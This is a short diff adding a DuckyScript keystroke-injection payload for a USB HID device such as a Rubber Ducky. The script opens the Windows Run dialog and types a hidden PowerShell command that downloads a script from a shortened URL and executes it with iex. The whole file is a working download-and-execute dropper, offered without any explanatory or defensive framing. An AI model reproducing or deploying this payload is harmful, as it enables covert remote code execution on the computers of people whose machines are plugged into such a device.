@@ -1,0 +1,8 @@
+REM AUTHOR KIERAN HUMAN
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -w hidden iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
+ENTER
+
